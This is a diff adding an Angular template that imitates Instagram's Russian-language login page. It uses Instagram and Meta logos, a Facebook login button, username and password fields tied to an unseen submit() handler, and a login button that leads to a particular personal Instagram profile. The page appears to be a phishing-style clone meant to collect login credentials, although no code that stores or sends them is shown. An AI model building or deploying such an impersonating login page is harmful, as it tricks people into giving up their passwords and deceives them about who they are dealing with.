@@ -1,1 +1,102 @@
-ssss
+<div class="container">
+  <div class="title">
+    <img
+      src="https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram.png"
+      alt=""
+    />
+  </div>
+
+  <div class="button">
+    <button>
+      <div class="img-container">
+        <img src="https://www.cdnlogo.com/logos/f/84/facebook.svg" alt="" />
+      </div>
+      <a
+        href="https://www.facebook.com/"
+        target="_blank"
+        rel="noopener noreferrer"
+        style="color: white"
+      >
+        Продолжить с аккаунтом Facebook</a
+      >
+    </button>
+  </div>
+
+  <div class="three-friends">
+    <div class="line"></div>
+    <div class="or">ИЛИ</div>
+    <div class="line"></div>
+  </div>
+
+  <form
+    id="sss"
+    class="mt-2"
+    [formGroup]="form"
+    (submit)="submit()"
+    autocomplete="off"
+  >
+    <div class="p-fluid">
+      <div class="col">
+        <div class="field">
+          <input
+            class="w-full"
+            formControlName="userName"
+            pInputText
+            placeholder="Телефон, имя пользователя или эл.адрес"
+          />
+        </div>
+
+        <div class="field">
+          <input
+            class="w-full"
+            formControlName="password"
+            pInputText
+            placeholder="Пароль"
+            [type]="showPassword ? 'text' : 'password'"
+          />
+          @if (form.get('password')?.value) {
+          <span class="show-password" (click)="showPassword = !showPassword"
+            >{{!showPassword ? 'Показать' : 'Скрыть'}}</span
+          >
+          }
+        </div>
+      </div>
+    </div>
+  </form>
+
+  <div class="forgot-password">Забыли пароль?</div>
+
+  <div class="log-in-button">
+    <button [disabled]="form.invalid" (click)="submit()">
+      @if (form.invalid) { Войти } @else {
+      <a
+        href="https://www.instagram.com/german__private?igsh=MWtwcWdlaXQxZmlzcg=="
+        target="_blank"
+        rel="noopener noreferrer"
+        style="color: white"
+      >
+        Войти</a
+      >
+      }
+    </button>
+  </div>
+
+  <div class="sign-up">
+    У вас ещё нет аккаунта?
+    <a href="#" style="margin-left: 4px; color: #1f78dd">Зарегистрироваться</a>
+  </div>
+
+  <div class="footer-line"></div>
+
+  <div class="footer">
+    <div class="center">
+      <div class="from">from</div>
+      <div class="meta-icon">
+        <img
+          src="https://i.pinimg.com/originals/7c/43/83/7c43837296f2b6ffc183286b20d3afa2.png"
+          alt=""
+        />
+      </div>
+    </div>
+  </div>
+</div>
